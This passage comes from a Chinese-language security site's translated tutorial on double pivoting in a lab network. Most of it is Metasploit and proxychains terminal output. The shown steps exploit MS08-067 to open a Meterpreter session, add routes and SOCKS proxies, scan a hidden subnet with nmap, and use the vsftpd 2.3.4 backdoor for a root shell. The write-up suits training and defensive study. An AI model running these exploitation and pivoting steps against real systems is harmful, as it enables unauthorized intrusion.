&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;EXITFUNC&nbsp;&nbsp;thread&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;technique&nbsp;(Accepted:&nbsp;&#39;&#39;,&nbsp;seh,&nbsp;thread,&nbsp;process,&nbsp;none)
&nbsp;&nbsp;&nbsp;LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4444&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;port
&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7.7.7.20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address
Exploit&nbsp;target:
&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Automatic&nbsp;Targeting
msf&nbsp;exploit(ms08_067_netapi)&nbsp;&gt;&nbsp;run
[*]&nbsp;Started&nbsp;bind&nbsp;handler
[*]&nbsp;7.7.7.20:445&nbsp;-&nbsp;Automatically&nbsp;detecting&nbsp;the&nbsp;target...
[*]&nbsp;7.7.7.20:445&nbsp;-&nbsp;Fingerprint:&nbsp;Windows&nbsp;2003&nbsp;-&nbsp;Service&nbsp;Pack&nbsp;2&nbsp;-&nbsp;lang:Unknown
[*]&nbsp;7.7.7.20:445&nbsp;-&nbsp;We&nbsp;could&nbsp;not&nbsp;detect&nbsp;the&nbsp;language&nbsp;pack,&nbsp;defaulting&nbsp;to&nbsp;English
[*]&nbsp;7.7.7.20:445&nbsp;-&nbsp;Selected&nbsp;Target:&nbsp;Windows&nbsp;2003&nbsp;SP2&nbsp;English&nbsp;(NX)
[*]&nbsp;7.7.7.20:445&nbsp;-&nbsp;Attempting&nbsp;to&nbsp;trigger&nbsp;the&nbsp;vulnerability...
[*]&nbsp;Sending&nbsp;stage&nbsp;(957999&nbsp;bytes)&nbsp;to&nbsp;7.7.7.20[*]&nbsp;Meterpreter&nbsp;session&nbsp;2&nbsp;opened&nbsp;(172.16.0.20-172.16.0.11:0&nbsp;-&gt;&nbsp;7.7.7.20:4444)&nbsp;
meterpreter&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">成功溢出getshell后查看JC(7.7.7.20)网卡信息:</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;ipconfigInterface&nbsp;&nbsp;1============Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;MS&nbsp;TCP&nbsp;Loopback&nbsp;interfaceHardware&nbsp;MAC&nbsp;:&nbsp;00:00:00:00:00:00MTU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1520IPv4&nbsp;Address&nbsp;:&nbsp;127.0.0.1Interface&nbsp;65539============Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Intel(R)&nbsp;PRO/1000&nbsp;MT&nbsp;Desktop&nbsp;AdapterHardware&nbsp;MAC&nbsp;:&nbsp;08:00:27:29:cd:cbMTU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1500IPv4&nbsp;Address&nbsp;:&nbsp;8.8.8.3IPv4&nbsp;Netmask&nbsp;:&nbsp;255.255.255.0Interface&nbsp;65540============Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Intel(R)&nbsp;PRO/1000&nbsp;MT&nbsp;Desktop&nbsp;Adapter&nbsp;#2Hardware&nbsp;MAC&nbsp;:&nbsp;08:00:27:e3:47:43MTU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1500IPv4&nbsp;Address&nbsp;:&nbsp;7.7.7.20IPv4&nbsp;Netmask&nbsp;:&nbsp;255.255.255.0meterpreter&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">发现又出现一个8.8.8.x的网段,于是将这个网段添加路由,以便msf中的模块可以访问到8.8.8.x网段.</span><br/><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x03 Step3</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">先直接用新的meterpreter shell看看8.8.8.x这个网段有什么机器</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;run&nbsp;post/windows/gather/arp_scanner&nbsp;RHOSTS=8.8.8.0/24[*]&nbsp;Running&nbsp;module&nbsp;against&nbsp;SRV03[*]&nbsp;ARP&nbsp;Scanning&nbsp;8.8.8.0/24[*]&nbsp;&nbsp;&nbsp;IP:&nbsp;8.8.8.3&nbsp;MAC&nbsp;08:00:27:29:cd:cb&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)[*]&nbsp;&nbsp;&nbsp;IP:&nbsp;8.8.8.1&nbsp;MAC&nbsp;0a:00:27:00:00:03&nbsp;(UNKNOWN)[*]&nbsp;&nbsp;&nbsp;IP:&nbsp;8.8.8.9&nbsp;MAC&nbsp;08:00:27:56:f1:7c&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)[*]&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;8.8.8.13&nbsp;MAC&nbsp;08:00:27:13:a3:b1&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了让msf中所有模块都能访问到8.8.8.x网段,在新的meterpreter会话中添加路由:</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;run&nbsp;autoroute&nbsp;-s&nbsp;8.8.8.0/24[*]&nbsp;Adding&nbsp;a&nbsp;route&nbsp;to&nbsp;8.8.8.0/255.255.255.0...[+]&nbsp;Added&nbsp;route&nbsp;to&nbsp;8.8.8.0/255.255.255.0&nbsp;via&nbsp;7.7.7.20[*]&nbsp;Use&nbsp;the&nbsp;-p&nbsp;option&nbsp;to&nbsp;list&nbsp;all&nbsp;active&nbsp;routes</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了让Attacker的除了msf模块以外的其他应用程序能访问到8.8.8.x网段,再使用msf的开启sock4代理的模块开启另外一个端口 作为8.8.8.x网段的入口:</span></p><pre class="brush:bash;toolbar:false">msf&nbsp;exploit(ms08_067_netapi)&nbsp;&gt;&nbsp;use&nbsp;auxiliary/server/socks4a&nbsp;
msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;
Module&nbsp;options&nbsp;(auxiliary/server/socks4a):
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;SRVHOST&nbsp;&nbsp;172.16.0.20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;address&nbsp;to&nbsp;listen&nbsp;on
&nbsp;&nbsp;&nbsp;SRVPORT&nbsp;&nbsp;1080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;port&nbsp;to&nbsp;listen&nbsp;on.
Auxiliary&nbsp;action:
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;Proxy&nbsp;&nbsp;
msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;set&nbsp;SRVPORT&nbsp;1081SRVPORT&nbsp;=&gt;&nbsp;1081msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;run
[*]&nbsp;Auxiliary&nbsp;module&nbsp;execution&nbsp;completed
[*]&nbsp;Starting&nbsp;the&nbsp;socks4a&nbsp;proxy&nbsp;server
msf&nbsp;auxiliary(socks4a)&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">也即现在Attacker本地的1080端口的代理可以访问到7.7.7.x网段,1081端口的代理可以访问到8.8.8.x网段,然后将新开的端口 添加到proxychains的配置文件中:</span></p><p><br/></p><pre class="brush:bash;toolbar:false">root@kali:~#&nbsp;cat&nbsp;/etc/proxychains.conf&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&quot;#&quot;dynamic_chainproxy_dns&nbsp;tcp_read_time_out&nbsp;15000tcp_connect_time_out&nbsp;8000socks4&nbsp;&nbsp;172.16.0.20&nbsp;1080&nbsp;&nbsp;#&nbsp;First&nbsp;Pivotsocks4&nbsp;&nbsp;172.16.0.20&nbsp;1081&nbsp;&nbsp;#&nbsp;Second&nbsp;Pivot</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">上面的两个代理相当于扇门的钥匙,172.16.0.20:1080是7.7.7.x的钥匙,172.16.0.20:1081是7.7.7.x后面的8.8.8.x的钥匙 ,Attacker要想访问到8.8.8.x可以通过先打开7.7.7.x的门,再打开8.8.8.x的门(因为8.8.8.x这个门在7.7.7.x这个门之后)</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用Attacker本地的nmap扫描下8.8.8.x网段:</span></p><pre class="brush:bash;toolbar:false">root@kali:~#&nbsp;proxychains&nbsp;nmap&nbsp;-sT&nbsp;-sV&nbsp;-p21,22,23,80&nbsp;8.8.8.9&nbsp;-n&nbsp;-Pn&nbsp;-vvProxyChains-3.1&nbsp;(http://proxychains.sf.net)Starting&nbsp;Nmap&nbsp;7.25BETA1&nbsp;(&nbsp;https://nmap.org&nbsp;)Nmap&nbsp;wishes&nbsp;you&nbsp;a&nbsp;merry&nbsp;Christmas!&nbsp;Specify&nbsp;-sX&nbsp;for&nbsp;Xmas&nbsp;Scan&nbsp;(https://nmap.org/book/man-port-scanning-techniques.html).NSE:&nbsp;Loaded&nbsp;36&nbsp;scripts&nbsp;for&nbsp;scanning.
Initiating&nbsp;Connect&nbsp;Scan
Scanning&nbsp;8.8.8.9&nbsp;[4&nbsp;ports]
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
Discovered&nbsp;open&nbsp;port&nbsp;21/tcp&nbsp;on&nbsp;8.8.8.9|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
Discovered&nbsp;open&nbsp;port&nbsp;23/tcp&nbsp;on&nbsp;8.8.8.9|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
Discovered&nbsp;open&nbsp;port&nbsp;22/tcp&nbsp;on&nbsp;8.8.8.9|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Discovered&nbsp;open&nbsp;port&nbsp;80/tcp&nbsp;on&nbsp;8.8.8.9Completed&nbsp;Connect&nbsp;Scan&nbsp;at&nbsp;05:54,&nbsp;1.37s&nbsp;elapsed&nbsp;(4&nbsp;total&nbsp;ports)Initiating&nbsp;Service&nbsp;scan&nbsp;at&nbsp;05:54
Scanning&nbsp;4&nbsp;services&nbsp;on&nbsp;8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Completed&nbsp;Service&nbsp;scan&nbsp;at&nbsp;05:54,&nbsp;11.09s&nbsp;elapsed&nbsp;(4&nbsp;services&nbsp;on&nbsp;1&nbsp;host)NSE:&nbsp;Script&nbsp;scanning&nbsp;8.8.8.9.
NSE:&nbsp;Starting&nbsp;runlevel&nbsp;1&nbsp;(of&nbsp;2)&nbsp;scan.
Initiating&nbsp;NSE&nbsp;at&nbsp;05:54
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Completed&nbsp;NSE&nbsp;at&nbsp;05:54,&nbsp;1.71s&nbsp;elapsed
NSE:&nbsp;Starting&nbsp;runlevel&nbsp;2&nbsp;(of&nbsp;2)&nbsp;scan.
Initiating&nbsp;NSE&nbsp;at&nbsp;05:54
Completed&nbsp;NSE&nbsp;at&nbsp;05:54,&nbsp;0.00s&nbsp;elapsed
Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;8.8.8.9
Host&nbsp;is&nbsp;up,&nbsp;received&nbsp;user-set&nbsp;(0.41s&nbsp;latency).
Scanned&nbsp;
PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;REASON&nbsp;&nbsp;VERSION
21/tcp&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syn-ack&nbsp;vsftpd&nbsp;2.3.4
22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syn-ack&nbsp;OpenSSH&nbsp;4.7p1&nbsp;Debian&nbsp;8ubuntu1&nbsp;(protocol&nbsp;2.0)23/tcp&nbsp;open&nbsp;&nbsp;telnet&nbsp;&nbsp;syn-ack&nbsp;Linux&nbsp;telnetd
80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;syn-ack&nbsp;Apache&nbsp;httpd&nbsp;2.2.8&nbsp;((Ubuntu)&nbsp;DAV/2)
Service&nbsp;Info:&nbsp;OSs:&nbsp;Unix,&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel
Read&nbsp;data&nbsp;files&nbsp;from:&nbsp;/usr/bin/../share/nmap
Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;14.59&nbsp;seconds
root@kali:~#</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">发现8.8.8.9(SK)这台机器可能有漏洞,用msf模块尝试getshell:</span></p><pre class="brush:bash;toolbar:false">msf&nbsp;&gt;&nbsp;msf&nbsp;&gt;&nbsp;use&nbsp;exploit/unix/ftp/vsftpd_234_backdoor&nbsp;msf&nbsp;exploit(vsftpd_234_backdoor)&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;Module&nbsp;options&nbsp;(exploit/unix/ftp/vsftpd_234_backdoor):&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;21&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;portExploit&nbsp;target:&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Automaticmsf&nbsp;exploit(vsftpd_234_backdoor)&nbsp;&gt;&nbsp;set&nbsp;rhost&nbsp;8.8.8.9rhost&nbsp;=&gt;&nbsp;8.8.8.9msf&nbsp;exploit(vsftpd_234_backdoor)&nbsp;&gt;&nbsp;run[*]&nbsp;8.8.8.9:21&nbsp;-&nbsp;Banner:&nbsp;220&nbsp;(vsFTPd&nbsp;2.3.4)[*]&nbsp;8.8.8.9:21&nbsp;-&nbsp;USER:&nbsp;331&nbsp;Please&nbsp;specify&nbsp;the&nbsp;password.[+]&nbsp;8.8.8.9:21&nbsp;-&nbsp;Backdoor&nbsp;service&nbsp;has&nbsp;been&nbsp;spawned,&nbsp;handling...[+]&nbsp;8.8.8.9:21&nbsp;-&nbsp;UID:&nbsp;uid=0(root)&nbsp;gid=0(root)[*]&nbsp;Found&nbsp;shell.[*]&nbsp;Command&nbsp;shell&nbsp;session&nbsp;4&nbsp;opened&nbsp;(Local&nbsp;Pipe&nbsp;-&gt;&nbsp;Remote&nbsp;Pipe)&nbsp;pwd/iduid=0(root)&nbsp;gid=0(root)ifconfigeth0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Link&nbsp;encap:Ethernet&nbsp;&nbsp;HWaddr&nbsp;08:00:27:56:f1:7c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inet&nbsp;addr:8.8.8.9&nbsp;&nbsp;Bcast:8.8.8.255&nbsp;&nbsp;Mask:255.255.255.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inet6&nbsp;addr:&nbsp;fe80::a00:27ff:fe56:f17c/64&nbsp;Scope:Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UP&nbsp;BROADCAST&nbsp;RUNNING&nbsp;MULTICAST&nbsp;&nbsp;MTU:1500&nbsp;&nbsp;Metric:1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RX&nbsp;packets:10843&nbsp;errors:0&nbsp;dropped:0&nbsp;overruns:0&nbsp;frame:0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TX&nbsp;packets:2779&nbsp;errors:0&nbsp;dropped:0&nbsp;overruns:0&nbsp;carrier:0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;collisions:0&nbsp;txqueuelen:1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RX&nbsp;bytes:1081842&nbsp;(1.0&nbsp;MB)&nbsp;&nbsp;TX&nbsp;bytes:661455&nbsp;(645.9&nbsp;KB)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Base&nbsp;address:0xd010&nbsp;Memory:f0000000-f0020000&nbsp;lo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Link&nbsp;encap:Local&nbsp;Loopback&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inet&nbsp;addr:127.0.0.1&nbsp;&nbsp;Mask:255.0.0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inet6&nbsp;addr:&nbsp;::1/128&nbsp;Scope:Host&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UP&nbsp;LOOPBACK&nbsp;RUNNING&nbsp;&nbsp;MTU:16436&nbsp;&nbsp;Metric:1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RX&nbsp;packets:18161&nbsp;errors:0&nbsp;dropped:0&nbsp;overruns:0&nbsp;frame:0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TX&nbsp;packets:18161&nbsp;errors:0&nbsp;dropped:0&nbsp;overruns:0&nbsp;carrier:0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;collisions:0&nbsp;txqueuelen:0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RX&nbsp;bytes:5307479&nbsp;(5.0&nbsp;MB)&nbsp;&nbsp;TX&nbsp;bytes:5307479&nbsp;(5.0&nbsp;MB)</pre><p style="text-indent: 2em;"><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/" target="_blank">原文链接：https://pentest.blog/explore-hidden-networks-with-double-pivoting/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】多重转发渗透隐藏内网 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3545" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
